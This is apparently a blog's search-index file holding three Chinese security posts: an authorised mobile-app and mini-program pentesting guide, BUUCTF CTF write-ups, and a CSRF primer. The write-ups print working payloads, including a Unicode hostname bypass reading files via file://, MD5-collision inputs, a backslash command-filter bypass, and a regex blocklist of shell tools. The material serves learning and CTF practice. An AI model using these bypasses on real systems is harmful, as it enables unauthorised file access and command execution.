<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APP与小程序端的WEB渗透测试</title>
    <url>/2020/08/24/App%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AB%AF%E7%9A%84WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1 id="APP与小程序端的WEB渗透测试"><a href="#APP与小程序端的WEB渗透测试" class="headerlink" title="APP与小程序端的WEB渗透测试"></a>APP与小程序端的WEB渗透测试</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font color="green">前言</font></h2><p>基于手机通信行业的发达，APP与小程序的使用人数也是越来越多。而传统的WEB端用户量反而又下降的趋势。所以在进行渗透测试的时候，需关注到APP和小程序端的资产，让我们的渗透测试能多点开花。</p>
<p>APP与小程序的渗透测试在本质上和WEB端没有区别，只是使用的载体从浏览器换成了APP和小程序。</p>
<p>这三者同样都是和服务器进行数据交互，所以在对APP和小程序进行渗透测试时的基本流程、漏洞检测与WEB端也是一样的。</p>
<hr>
<h2 id="工具与环境"><a href="#工具与环境" class="headerlink" title="工具与环境"></a><font color="green">工具与环境</font></h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ol>
<li><p><strong>安卓模拟器</strong></p>
<p>大多数安卓模拟器都可以进行渗透测试（我之前用的夜神模拟器，现在用的mumu模拟器）</p>
</li>
<li><p><strong>Burpsuite</strong></p>
<p>WEB渗透测试必备</p>
</li>
<li><p>被动扫描器（非必须）</p>
<p>习惯用Xray，当然只是在要测试的业务很多的时候使用（省时间），而且要调小线程，以免影响业务正常</p>
</li>
</ol>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p><img src="https://s1.ax1x.com/2020/08/10/abIwTO.png" alt="abIwTO.png"></p>
<p>burp中在Proxy -&gt; Options 中添加一个监听，ip是本机ip，端口随便填</p>
<p><img src="https://s1.ax1x.com/2020/08/10/abId0K.png" alt="abId0K.png"></p>
<p>在模拟器中修改wifi的高级选项，选择手动添加代理，ip与端口要和刚刚在burp中添加的一致</p>
<p>接着要安装证书，在浏览器中访问192.168.1.101:8888，下载证书。将后缀改成.cer</p>
<p>进入设置-&gt;安全-&gt;从sd卡安装</p>
<p><img src="https://s1.ax1x.com/2020/08/10/abINOx.png" alt="abINOx.png"></p>
<p>找到刚刚下载的证书，点击即可安装</p>
<p><img src="https://s1.ax1x.com/2020/08/10/abIam6.png" alt="abIam6.png"></p>
<p>在模拟器中的浏览器访问下百度，发现成功抓到包，说明环境配置成功了</p>
<hr>
<h2 id="APP-小程序端常见漏洞"><a href="#APP-小程序端常见漏洞" class="headerlink" title="APP/小程序端常见漏洞"></a><font color="green">APP/小程序端常见漏洞</font></h2><h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><p>在前言里我们讲过，APP/小程序和普通的web端没有很大区别。展示给用户看用的前端语言同样是<strong>html</strong>(h5)+css(css3)+js，所以同样存在XSS漏洞。</p>
<p><strong>漏洞一般存在的业务功能</strong>：<strong>评论</strong>、修改个人信息、留言、<strong>发帖</strong>、回帖等能插入数据的功能点（这里只讨论存储型XSS）</p>
<p>某小程序测试（授权）存储XSS</p>
<p><img src="https://s1.ax1x.com/2020/08/10/abLR2D.jpg" alt="abLR2D.jpg"></p>
<p><img src="https://s1.ax1x.com/2020/08/10/abXZp8.png" alt="abXZp8.png"></p>
<p>由于有时候有waf，所以一般要先尝试绕一绕，实在因为时间原因可以直接fuzz，贴上个我常用的fuzz字典：<a href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/easyXssPayload/burpXssPayload.txt" target="_blank" rel="noopener">XSSpayload</a></p>
<h3 id="短信-邮箱爆破"><a href="#短信-邮箱爆破" class="headerlink" title="短信/邮箱爆破"></a>短信/邮箱爆破</h3><p>在登录界面的手机号验证功能一般会有这种漏洞，抓包重放即可达到无限制爆破</p>
<p>某小程序（授权）越权测试</p>
<p><img src="https://s1.ax1x.com/2020/08/13/dp5EWt.jpg" alt="dp5EWt.jpg"></p>
<p>用网上的接码平台测试</p>
<p><img src="https://s1.ax1x.com/2020/08/13/dp5eQf.jpg" alt="dp5eQf.jpg"></p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>在做APP和小程序的渗透测试时，我发现很多页面都是以json格式返回数据，再经过前端渲染展示出来。而很多这种json返回包都没做加密，很容易就能查看到其他用户的信息</p>
<p>例子：</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>code<span class="token operator">:</span>'<span class="token number">200</span>'<span class="token punctuation">,</span>result<span class="token operator">:</span>'查询成功'<span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>name<span class="token operator">:</span>'张三'<span class="token punctuation">,</span>phone<span class="token operator">:</span>'<span class="token number">13088888888</span>'<span class="token punctuation">,</span>mail<span class="token operator">:</span>'test@<span class="token number">163</span>.com'<span class="token punctuation">,</span>address<span class="token operator">:</span>'广东广州xx路xx号'<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p>漏洞一般存在于页面上有其他用户交互的地方，如帖子、评论、运动功能（类似微信运动那样）等。</p>
<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>在和用户交互的页面上，若对返回包没进行加密可查看到用户id，以此可达到越权</p>
<p>例子：某帖子下方评论处返回包查看到用户id</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>code<span class="token operator">:</span>'<span class="token number">200</span>'<span class="token punctuation">,</span>result<span class="token operator">:</span>'查询成功'<span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>userid<span class="token operator">:</span>'<span class="token number">111111</span>'<span class="token punctuation">,</span>commentid<span class="token operator">:</span>'098f6bcd4621d373cade4e832627b4f6'<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p>拿到其他用户的id后即可越权查看用户信息、越权添加/删除评论等等</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>一般小程序抓到的请求包和WEB端没区别，和WEB端一样测试SQL注入即可</p>
<blockquote>
<p>不过一般小程序和app的接口服务器有WAF</p>
</blockquote>
<h2 id="Burp与Xray联动测试"><a href="#Burp与Xray联动测试" class="headerlink" title="Burp与Xray联动测试"></a><font color="green">Burp与Xray联动测试</font></h2><p>首先Xray监听本地7777端口，开启被动扫描模式</p>
<p><img src="https://s1.ax1x.com/2020/08/13/dpfJSK.png" alt="dpfJSK.png"></p>
<p>接着Burp的前提配置（<strong>工具与环境</strong>中的配置）不变的情况下，在burp中的<strong>User options -&gt; Connections -&gt; Upstream Proxy Servers</strong>中添加监听端口7777</p>
<p><img src="https://s1.ax1x.com/2020/08/13/dphLgf.png" alt="dphLgf.png"></p>
<p>接着Burp抓到的包就能送到Xray进行被动扫描了</p>
<p>该方法适合于要测试的资产较多和复测阶段使用</p>
<blockquote>
<p>注意调小xray的线程，以免影响到业务正常</p>
</blockquote>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF刷题记录（一）</title>
    <url>/2020/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="BUUCTF刷题记录（一）"><a href="#BUUCTF刷题记录（一）" class="headerlink" title="BUUCTF刷题记录（一）"></a>BUUCTF刷题记录（一）</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><p>这题主要是利用了<strong>CVE-2019-9636：urlsplit不处理NFKC标准化</strong> </p>
<p>题目源码：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Blueprint<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> escape <span class="token punctuation">,</span>render_template
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlsplit<span class="token punctuation">,</span> urlunsplit<span class="token punctuation">,</span> unquote
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Index</span>
@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">app_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>
    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host
    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#去掉 url 中的空格</span>
    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre>
<p>先用两个host判断是不是suctf.cc，如果不是再进入第三个host判断。第三个经过了 decode(‘utf-8’) 之后传进了 urlunsplit 函数，在第三个判断中又必须要等于 suctf.cc 才行。</p>
<p>于是利用ℂ来代替c及进行绕过</p>
<p>构造<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>，得到：</p>
<pre class=" language-python"><code class="language-python">server <span class="token punctuation">{</span> listen <span class="token number">80</span><span class="token punctuation">;</span> location <span class="token operator">/</span> <span class="token punctuation">{</span> try_files $uri @app<span class="token punctuation">;</span> <span class="token punctuation">}</span> location @app <span class="token punctuation">{</span> include uwsgi_params<span class="token punctuation">;</span> uwsgi_pass unix<span class="token punctuation">:</span><span class="token operator">//</span><span class="token operator">/</span>tmp<span class="token operator">/</span>uwsgi<span class="token punctuation">.</span>sock<span class="token punctuation">;</span> <span class="token punctuation">}</span> location <span class="token operator">/</span>static <span class="token punctuation">{</span> alias <span class="token operator">/</span>app<span class="token operator">/</span>static<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true"># location /flag { # alias /usr/fffffflag; # } }</span></code></pre>
<p>最终payload：</p>
<pre><code>?url=file://suctf.cℂ/fffffflag</code></pre><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>打开网站发现左上角有张图片是从url里调用的，解密img参数。两重base64+一重hex。那么尝试获取index.php的内容。把index.php先hex加密，再两次base64加密传回img参数，然后获得经过base64加密后的index.php代码，解密得到index.php :</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span> <span class="token punctuation">.</span> <span class="token variable">$txt</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>
  body<span class="token punctuation">{</span>
   background<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>bj<span class="token punctuation">.</span>png<span class="token punctuation">)</span>  no<span class="token operator">-</span>repeat center center<span class="token punctuation">;</span>
   background<span class="token operator">-</span>size<span class="token punctuation">:</span>cover<span class="token punctuation">;</span>
   background<span class="token operator">-</span>attachment<span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
   background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token shell-comment comment">#CCCCCC;</span>
<span class="token punctuation">}</span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
<p>我们看到可以传入cmd参数进行代码执行，但有个md5判断：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </code></pre>
<p>我们构造两个参数a，b绕过这个判断</p>
<pre class=" language-php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span>4d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span>0e<span class="token operator">%</span>e3<span class="token operator">%</span>5c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span>7b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span>6f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span>1b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span>4a<span class="token operator">%</span>3d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span>3e<span class="token operator">%</span>7b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>4b<span class="token operator">%</span>f3<span class="token operator">%</span>6e<span class="token operator">%</span>8e<span class="token operator">%</span>4b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span>5f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span>6d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>5d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span>5f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span>4d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span>0e<span class="token operator">%</span>e3<span class="token operator">%</span>5c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span>7b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span>6f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span>1b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span>4a<span class="token operator">%</span>3d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span>3e<span class="token operator">%</span>7b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>4b<span class="token operator">%</span>f3<span class="token operator">%</span>6e<span class="token operator">%</span>8e<span class="token operator">%</span>4b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span>5f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span>6d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span>5d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span>5f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre>
<p>然后发现cmd参数经过了过滤：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span>"<span class="token operator">/</span>ls<span class="token operator">|</span>bash<span class="token operator">|</span>tac<span class="token operator">|</span>nl<span class="token operator">|</span>more<span class="token operator">|</span>less<span class="token operator">|</span>head<span class="token operator">|</span>wget<span class="token operator">|</span>tail<span class="token operator">|</span>vi<span class="token operator">|</span>cat<span class="token operator">|</span>od<span class="token operator">|</span>grep<span class="token operator">|</span>sed<span class="token operator">|</span>bzmore<span class="token operator">|</span>bzless<span class="token operator">|</span>pcre<span class="token operator">|</span>paste<span class="token operator">|</span>diff<span class="token operator">|</span>file<span class="token operator">|</span><span class="token keyword">echo</span><span class="token operator">|</span>sh<span class="token operator">|</span>\'<span class="token operator">|</span>\"<span class="token operator">|</span>\`<span class="token operator">|</span><span class="token punctuation">;</span><span class="token operator">|</span><span class="token punctuation">,</span><span class="token operator">|</span>\<span class="token operator">*</span><span class="token operator">|</span>\<span class="token operator">?</span><span class="token operator">|</span>\</code></pre>
<p>查了资料发现linux命令可以用反斜杠</p>
<p>故可构造：<code>ca\t /fl\ag</code>得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Writeup</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF漏洞学习</title>
    <url>/2019/10/26/CSRF%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="CSRF学习"><a href="#CSRF学习" class="headerlink" title="CSRF学习"></a>CSRF学习</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li>CSRF（Cross-site request forgery）跨站请求伪造，通过<font color="red">伪装成受信任用户</font>的请求来利用受信任的网站。</li>
</ul>
<a id="more"></a>

<blockquote>
<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>
</blockquote>
<hr>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-GET型"><a href="#1-GET型" class="headerlink" title="1.GET型"></a>1.GET型</h3><ul>
<li>通过修改get请求的参数，来达到攻击的目的</li>
</ul>
<blockquote>
<p>如：/user.php?id=1&amp;email=123@163.com，这个链接的意思是用户id=1将邮箱修改为<a href="mailto:123@163.com">123@163.com</a>。当我们把这个链接修改为 /user.php?id=1&amp;email=abc@163.com ，然后通过各种手段发送给被攻击者，诱使被攻击者点击我们的链接，==当用户刚好在访问这个网站==，他同时又点击了这个链接，那么这个用户的邮箱被修改为<a href="mailto:abc@163.com">abc@163.com</a></p>
</blockquote>
